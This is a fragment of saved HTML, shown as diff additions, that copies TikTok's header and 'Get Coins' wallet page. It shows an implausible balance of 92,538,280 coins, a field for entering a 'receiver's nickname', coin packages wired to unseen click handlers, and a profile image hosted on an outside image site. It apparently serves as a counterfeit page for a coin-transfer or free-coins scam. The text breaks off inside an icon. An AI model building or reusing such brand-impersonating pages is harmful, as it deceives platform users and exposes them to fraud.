+  background-color: rgba(0, 0, 0, 0.5) !important;
+  display: flex !important;
+  flex-direction: column !important;
+  align-items: center !important;
+  justify-content: center !important;
+  border-radius: 16px !important;
+}
+.imt-image-status img,
+.imt-image-status svg,
+.imt-img-loading {
+  width: 28px !important;
+  height: 28px !important;
+  margin: 0 0 8px 0 !important;
+  min-height: 28px !important;
+  min-width: 28px !important;
+  position: relative !important;
+}
+.imt-img-loading {
+  background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAA4CAMAAACfWMssAAAAtFBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////oK74hAAAAPHRSTlMABBMIDyQXHwyBfFdDMSw+OjXCb+5RG51IvV/k0rOqlGRM6KKMhdvNyZBz9MaupmxpWyj437iYd/yJVNZeuUC7AAACt0lEQVRIx53T2XKiUBCA4QYOiyCbiAsuuGBcYtxiYtT3f6/pbqoYHVFO5r+iivpo6DpAWYpqeoFfr9f90DsYAuRSWkFnPO50OgR9PwiCUFcl2GEcx+N/YBh6pvKaefHlUgZd1zVe0NbYcQjGBfzrPE8Xz8aF+71D8gG6DHFPpc4a7xFiCDuhaWgKgGIJQ3d5IMGDrpS4S5KgpIm+en9f6PlAhKby4JwEIxlYJV9h5k5nee9GoxHJ2IDSNB0dwdad1NAxDJ/uXDHYmebdk4PdbkS58CIVHdYSUHTYYRWOJblWSyu2lmy3KNFVJNBhxcuGW4YBVCbYGRZwIooipHsNqjM4FbgOQqQqSKQQU9V8xmi1QlgHqQQ6DDBvRUVCDirs+EzGDGOQTCATgtYTnbCVLgsVgRE0T1QE0qHCFAht2z6dLvJQs3Lo2FQoDxWNUiBhaP4eRgwNkI+dAjVOA/kUrIDwf3CG8NfNOE0eiFotSuo+rBiq8tD9oY4Qzc6YJw99hl1wzpQvD7ef2M8QgnOGJfJw+EltQc+oX2yn907QB22WZcvlUpd143dqQu+8pCJZuGE4xCuPXJqqcs5sNpsI93Rmzym1k4Npk+oD1SH3/a3LOK/JpUBpWfqNySxWzCfNCUITuDG5dtuphrUJ1myeIE9bIsPiKrfqTai5WZxbhtNphYx6GEIHihyGFTI69lje/rxajdh0s0msZ0zYxyPLhYCb1CyHm9Qsd2H37Y3lugVwL9kNh8Ot8cha6fUNQ8nuXi5z9/ExsAO4zQrb/ev1yrCB7lGyQzgYDGuxq1toDN/JGvN+HyWNHKB7zEoK+PX11e12G431erGYzwmytAWU56fkMHY5JJnDRR2eZji3AwtIcrEV8Cojat/BdQ7XOwGV1e1hDjGGjXbdArm8uJZtCH5MbcctVX8A1WpqumJHwckAAAAASUVORK5CYII=");
+  background-size: 28px 28px;
+  animation: image-loading-rotate 1s linear infinite !important;
+}
+
+.imt-image-status span {
+  color: var(--bg-2, #fff) !important;
+  font-size: 14px !important;
+  line-height: 14px !important;
+  font-weight: 500 !important;
+  font-family: "PingFang SC", Arial, sans-serif !important;
+}
+
+.imt-primary-button {
+  display: flex;
+  padding: 12px 80px;
+  justify-content: center;
+  align-items: center;
+  gap: 8px;
+  border-radius: 8px;
+  background: #ea4c89;
+  color: #fff;
+  font-size: 16px;
+  font-style: normal;
+  font-weight: 700;
+  line-height: 24px;
+  border: none;
+  cursor: pointer;
+}
+
+.imt-retry-text {
+  color: #999;
+  text-align: center;
+  font-size: 14px;
+  font-style: normal;
+  font-weight: 400;
+  line-height: 21px;
+  cursor: pointer;
+}
+
+.imt-action-container {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.imt-modal-content-text {
+  text-align: left;
+  color: #333;
+  font-size: 16px;
+  font-weight: 400;
+  line-height: 24px;
+}
+
+@keyframes image-loading-rotate {
+  from {
+    transform: rotate(360deg);
+  }
+  to {
+    transform: rotate(0deg);
+  }
+}
+
+.imt-linear-gradient-text {
+  background: linear-gradient(90deg, #00a6ff 0%, #c369ff 52.4%, #ff4590 100%);
+  background-clip: text;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.imt-flex-center {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.imt-linear-black-btn {
+  border-radius: 50px;
+  background: linear-gradient(66deg, #222 19%, #696969 94.25%);
+  height: 48px;
+  width: 100%;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  justify-content: center;
+}
+</style></head><body style="height: 100%; min-height: 100%;" class=""><div id="app" style="height:100%;min-height:100%;justify-content:center"><main class="tiktok-t31vku-MainLiveLayoutContainer ex87w4v0" id="tiktok-live-main-container-id"><div class="tiktok-xk7ai4-DivHeaderContainer e10win0d0" style="right:0"><div class="tiktok-1gd9bb4-DivHeaderWrapperMain e10win0d1"><div class="tiktok-oteyea-DivLeftContainer e1r8d7c0"><span class="tiktok-dx28vs-SpanHamburgerContainer ep1j4vz2"><span class="tiktok-1g7ql4c-SpanHamburgerWrapper ep1j4vz0"><span class="tiktok-5eteof-SpanHamburgerPath ep1j4vz1"></span> <span class="tiktok-5eteof-SpanHamburgerPath ep1j4vz1"></span> <span class="tiktok-5eteof-SpanHamburgerPath ep1j4vz1"></span></span></span> <a aria-label="Go to TikTok For You feed" class="e1an6zpe0 tiktok-ojnv26-StyledLink-StyledLinkLogo er1vbsz0" data-e2e="tiktok-logo" href="#" style="position:relative"><svg alt="TikTok" fill="none" height="42" viewBox="0 0 118 42" width="118" xmlns="http://www.w3.org/2000/svg"><path d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z" fill="#25F4EE"></path><path d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z" fill="#25F4EE"></path><path d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z" fill="#FE2C55"></path><path d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z" fill="#FE2C55"></path><path d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z" fill="black"></path><path d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z" fill="#25F4EE"></path><path d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z" fill="#FE2C55"></path><path d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z" fill="black"></path></svg> <strong>TikTok</strong></a></div><div class="tiktok-1x100u9-DivHeaderCenterContainer eeptrdg0"><div class="tiktok-1asq5wp-DivSearchFormContainer e1hi1cmj0"></div></div><div class="tiktok-q8q040-DivHeaderRightContainer e13wiwn60"><div class="tiktok-szsi1x-DivUploadContainer e18d3d940" data-e2e="upload-icon"><a aria-label="Upload a video" class="e18d3d942 tiktok-2gvzau-ALink-StyledLink er1vbsz1" href="#" target="_self"><div class="tiktok-1qup28j-DivUpload e18d3d944"><svg class="tiktok-qeydvm-StyledPlusIcon e18d3d945" data-e2e="" fill="currentColor" height="1em" viewBox="0 0 16 16" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M8 2.5C7.58579 2.5 7.25 2.83579 7.25 3.25V7.25H3.25C2.83579 7.25 2.5 7.58579 2.5 8C2.5 8.41421 2.83579 8.75 3.25 8.75H7.25V12.75C7.25 13.1642 7.58579 13.5 8 13.5C8.41421 13.5 8.75 13.1642 8.75 12.75V8.75H12.75C13.1642 8.75 13.5 8.41421 13.5 8C13.5 7.58579 13.1642 7.25 12.75 7.25H8.75V3.25C8.75 2.83579 8.41421 2.5 8 2.5Z" fill-rule="evenodd"></path></svg><span class="tiktok-y3rt08-SpanUploadText e18d3d946">Upload</span></div></a></div><div class="tiktok-9j9jz0-DivMessageIconContainer e1nx07zo0" data-e2e="top-dm-icon"><a aria-label="Open messages" class="tiktok-22xkqc-StyledLink er1vbsz0" href="#"><span><svg class="tiktok-y48l9g-StyledIcon e1nx07zo1" data-e2e="" fill="currentColor" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M2.17877 7.17357C2.50304 6.45894 3.21528 6 4.00003 6H44C44.713 6 45.372 6.37952 45.7299 6.99615C46.0877 7.61278 46.0902 8.37327 45.7365 8.99228L25.7365 43.9923C25.3423 44.6821 24.5772 45.0732 23.7872 44.9886C22.9972 44.9041 22.3321 44.3599 22.0929 43.6023L16.219 25.0017L2.49488 9.31701C1.97811 8.72642 1.85449 7.88819 2.17877 7.17357ZM20.377 24.8856L24.531 38.0397L40.5537 10H8.40757L18.3918 21.4106L30.1002 14.2054C30.5705 13.9159 31.1865 14.0626 31.4759 14.533L32.5241 16.2363C32.8136 16.7066 32.6669 17.3226 32.1966 17.612L20.377 24.8856Z" fill-rule="evenodd"></path></svg></span></a></div><div aria-expanded="false" aria-label="Inbox
+0 unread notifications" class="tiktok-1deszxq-DivHeaderInboxContainer e18kkhh40" data-e2e="inbox-icon" role="button" tabindex="0"><span><svg class="tiktok-1g0p6jv-StyledInboxIcon e18kkhh41" data-e2e="" fill="currentColor" height="32" viewBox="0 0 32 32" width="32" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M24.0362 21.3333H18.5243L15.9983 24.4208L13.4721 21.3333H7.96047L7.99557 8H24.0009L24.0362 21.3333ZM24.3705 23.3333H19.4721L17.2883 26.0026C16.6215 26.8176 15.3753 26.8176 14.7084 26.0026L12.5243 23.3333H7.62626C6.70407 23.3333 5.95717 22.5845 5.9596 21.6623L5.99646 7.66228C5.99887 6.74352 6.74435 6 7.66312 6H24.3333C25.2521 6 25.9975 6.7435 26 7.66224L26.0371 21.6622C26.0396 22.5844 25.2927 23.3333 24.3705 23.3333ZM12.6647 14C12.2965 14 11.998 14.2985 11.998 14.6667V15.3333C11.998 15.7015 12.2965 16 12.6647 16H19.3313C19.6995 16 19.998 15.7015 19.998 15.3333V14.6667C19.998 14.2985 19.6995 14 19.3313 14H12.6647Z" fill-rule="evenodd"></path></svg></span><div data-focus-guard="true" style="width:1px;height:0;padding:0;overflow:hidden;position:fixed;top:1px;left:1px" tabindex="-1"></div><div data-focus-lock-disabled="disabled"><div aria-label="Notifications" class="tiktok-1idvj23-DivHeaderInboxWrapper e18kkhh49" role="dialog"><svg class="tiktok-e0rxz1-StyledArrow e18kkhh48" fill="rgba(255, 255, 255, 1)" height="8" viewBox="0 0 24 8" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 8c7 0 10-8 12-8s5 8 12 8z"></path></svg><div class="tiktok-vubwh3-DivInboxContainer e32s1fi0" data-e2e="inbox-notifications"><div class="tiktok-19hvf92-DivInboxHeaderContainer e1bp8k4k0"><h2 class="tiktok-fxwr5e-H2InboxTitle e1bp8k4k1" id="header-inbox-title">Notifications</h2><div aria-labelledby="header-inbox-title" class="tiktok-10apsbc-DivGroupContainer e1bp8k4k3" data-e2e="inbox-bar" id="header-inbox-bar" role="tablist"><button aria-controls="header-inbox-list" aria-selected="true" class="tiktok-7gu37x-ButtonGroupItem e1bp8k4k4" data-e2e="all" id="inbox-tab-0" role="tab" tabindex="0">All activity</button><button aria-controls="header-inbox-list" aria-selected="false" class="tiktok-18a9ome-ButtonGroupItem e1bp8k4k4" data-e2e="likes" id="inbox-tab-1" role="tab" tabindex="-1">Likes</button><button aria-controls="header-inbox-list" aria-selected="false" class="tiktok-18a9ome-ButtonGroupItem e1bp8k4k4" data-e2e="comments" id="inbox-tab-2" role="tab" tabindex="-1">Comments</button><button aria-controls="header-inbox-list" aria-selected="false" class="tiktok-18a9ome-ButtonGroupItem e1bp8k4k4" data-e2e="mentions" id="inbox-tab-3" role="tab" tabindex="-1">Mentions and tags</button><button aria-controls="header-inbox-list" aria-selected="false" class="tiktok-18a9ome-ButtonGroupItem e1bp8k4k4" data-e2e="followers" id="inbox-tab-4" role="tab" tabindex="-1">Followers</button></div></div><div aria-labelledby="inbox-tab-0" class="tiktok-o6y5r-DivInboxContentContainer e11z9zg00" data-e2e="inbox-list" id="header-inbox-list" role="tabpanel" tabindex="0"><div class="tiktok-s2p7qm-DivErrorContainer e1d0xjxi0"><svg data-e2e="" fill="rgba(22, 24, 35, .34)" height="70" viewBox="0 0 72 72" width="70" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M34.4961 70.3557C34.7809 70.7422 35.2335 70.971 35.7166 70.971C36.1997 70.971 36.6522 70.7422 36.937 70.3557L45.7854 58.5121H65.6332C67.6978 58.5121 69.376 56.834 69.376 54.7693V4.77091C69.376 2.70629 67.6978 1.02815 65.6332 1.02815H5.79989C3.73527 1.02815 2.05713 2.70629 2.05713 4.77091V54.7693C2.05713 56.834 3.73527 58.5121 5.79989 58.5121H25.6477L34.4961 70.3557ZM5.10829 4.77135C5.10829 4.38996 5.4185 4.07976 5.79989 4.07976H65.6281C66.0095 4.07976 66.3197 4.38996 66.3197 4.77135V54.7749C66.3197 55.1562 66.0095 55.4665 65.6281 55.4665H45.0175C44.5395 55.4665 44.0869 55.6902 43.7971 56.0767L35.7166 66.8981L27.6361 56.0767C27.3513 55.6902 26.8987 55.4614 26.4156 55.4614H5.79989C5.4185 55.4614 5.10829 55.1512 5.10829 54.7698V4.77135Z" fill-rule="evenodd"></path><path d="M49.6956 31.2955H21.7368C20.8926 31.2955 20.2112 30.6141 20.2112 29.7699C20.2112 28.9258 20.8926 28.2443 21.7368 28.2443H49.6956C50.5398 28.2443 51.2212 28.9258 51.2212 29.7699C51.2212 30.6141 50.5398 31.2955 49.6956 31.2955Z"></path></svg><p class="tiktok-ria3yh-PErrorTitle e1d0xjxi1">All activity</p><p class="tiktok-3zu31k-PErrorDesc e1d0xjxi2">Notifications about your account will appear here.</p></div></div></div></div></div><div data-focus-guard="true" style="width:1px;height:0;padding:0;overflow:hidden;position:fixed;top:1px;left:1px" tabindex="-1"></div></div><div aria-controls="" aria-expanded="false" aria-haspopup="true" aria-label="Open settings menu" class="tiktok-15iwytd-DivProfileContainer efubjyv0" data-e2e="profile-icon" id="header-more-menu-icon" role="button" style="background-image:url('https://i.ibb.co/5R2VNRk/34c4032d077f8182e179f70031c05119.png')" tabindex="0"></div></div></div></div><div class="tiktok-1qjl7qr-DivMainContainer eo5jqmb1"><div class="tiktok-lp888x-DivContentContainer eo5jqmb2"><section class="tiktok-18xp9s9-SectionContentWrapper e1sanywi0"><div class="tiktok-k58u1v-DivTitleInfoContainer e1sanywi1"><h1 class="tiktok-12970u9-H1TitleInfoCoin e1sanywi2" data-e2e="wallet-title-get-coins">Get Coins</h1><a class="tiktok-9jfqt5-StyledTransactionHistoryLink e1sanywi3" data-e2e="wallet-transaction-history-entrance" href="#">View transaction history</a></div><div class="tiktok-krn24s-DivProfileAndBannerRow e1sanywi8"><div class="tiktok-d2sjra-DivProfileInfo e1sanywi9"><div aria-controls="" class="tiktok-15iwytd-DivProfileContainer efubjyv0" data-e2e="profile-icon" role="button" style="background-image:url('https://i.ibb.co/5R2VNRk/34c4032d077f8182e179f70031c05119.png');height:44px;min-width:44px;margin-left:0"></div><div class="tiktok-9l16e2-DivNameCoinInfo e1sanywi10"><span class="tiktok-1uiqlhf-SpanNameInfo e1sanywi12" data-e2e="wallet-user-name">TikToker</span><div class="tiktok-6vx15k-DivCoinInfo e1sanywi11"><svg class="tiktok-908odc-StyledCoinIcon e1sanywi5" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg> <span class="tiktok-1bro1iw-SpanCoinNum e1sanywi4 text-dark fs-9 text-bold" data-e2e="wallet-coins-balance">92,538,280</span></div></div></div></div></section><br><div class="tiktok-1x100u9-DivHeaderCenterContainer eeptrdg0" style="width:30%"><div class="tiktok-1asq5wp-DivSearchFormContainer e1hi1cmj0"><form class="search-input tiktok-dhqzc6-FormElement e14ntknm0" data-e2e="search-box"><input aria-label="Search" class="tiktok-u4se1t-InputElement e14ntknm3" id="uid" placeholder="Enter the receiver's nickname" role="combobox" type="search" style="box-shadow: red 0px 0px 0px;"> <span class="tiktok-hck1rr-SpanSpliter e14ntknm6"></span><button aria-label="Enter the receiver's nickname" class="tiktok-16dy42q-ButtonSearch e14ntknm7" data-e2e="search-box-button" type="submit"><div class="tiktok-17iic05-DivSearchIconContainer e14ntknm8"><svg data-e2e="" fill="rgba(22, 24, 35, .34)" height="24" viewBox="0 0 48 48" width="24" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M22 10C15.3726 10 10 15.3726 10 22C10 28.6274 15.3726 34 22 34C28.6274 34 34 28.6274 34 22C34 15.3726 28.6274 10 22 10ZM6 22C6 13.1634 13.1634 6 22 6C30.8366 6 38 13.1634 38 22C38 25.6974 36.7458 29.1019 34.6397 31.8113L43.3809 40.5565C43.7712 40.947 43.7712 41.5801 43.3807 41.9705L41.9665 43.3847C41.5759 43.7753 40.9426 43.7752 40.5521 43.3846L31.8113 34.6397C29.1019 36.7458 25.6974 38 22 38C13.1634 38 6 30.8366 6 22Z" fill-rule="evenodd"></path></svg></div></button><div class="tiktok-1mdii59-DivInputBorder e14ntknm1"></div></form></div></div><div class="tiktok-1jtww57-DivRechargeCoins eyr93xl0" data-e2e="wallet-buy-coins-title"><span class="tiktok-z95cm-SpanContentContainer e13as4wb0"><div class="tiktok-o49lq0-DivRechargeAdvantageInfo e13as4wb2" data-e2e="wallet-recharge-advantage-tip"><span class="tiktok-1rwkvc8-SpanRechargeTitle e13as4wb3"></span> <span style="color:#000">Recharge:</span> Save around 35% with a lower third-party service fee.<div aria-describedby="webapp-advantage" aria-labelledby="tux-1" class="tiktok-1lfugd2-DivExplanationContainer e13as4wb4" data-e2e="wallet-recharge-advantage-icon" data-tux-tooltip="tux-1" tabindex="0"><svg class="tiktok-n2pfir-StyledExclamationMarkCircleIcon e13as4wb5" data-e2e="" fill="currentColor" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM27 16C27 17.6569 25.6569 19 24 19C22.3431 19 21 17.6569 21 16C21 14.3431 22.3431 13 24 13C25.6569 13 27 14.3431 27 16ZM23 22C22.4477 22 22 22.4477 22 23V34C22 34.5523 22.4477 35 23 35H25C25.5523 35 26 34.5523 26 34V23C26 22.4477 25.5523 22 25 22H23Z" fill-rule="evenodd"></path></svg></div></div></span></div><div class="tiktok-1un7bi9-DivCoinsBkgContainer eyr93xl1"><ol class="tiktok-1a7iizi-OlCoinsListContainer eyr93xl2" data-e2e="wallet-coins-packages"><li onclick="btn2()"><button class="e4yj8b60 tiktok-l4v9n8-ButtonContainer" id="platform1" onclick="Selectedplatform(&quot;platform1&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62" data-e2e="wallet-package-coin-icon-0"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-0">20</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-0">$US 0,29</span></div></button></li><li onclick="btn2()"><button class="e4yj8b60 tiktok-l4v9n8-ButtonContainer" id="platform2" onclick="Selectedplatform(&quot;platform2&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62" data-e2e="wallet-package-coin-icon-1"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-1">70</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-1">$US 1,00</span></div></button></li><li onclick="btn2()"><button class="e4yj8b60 tiktok-l4v9n8-ButtonContainer" id="platform3" onclick="Selectedplatform(&quot;platform3&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62" data-e2e="wallet-package-coin-icon-2"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-2">350</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-2">$US 5</span></div></button></li><li onclick="btn2()"><button class="tiktok-l4v9n8-ButtonContainer e4yj8b60" id="platform4" onclick="Selectedplatform(&quot;platform4&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 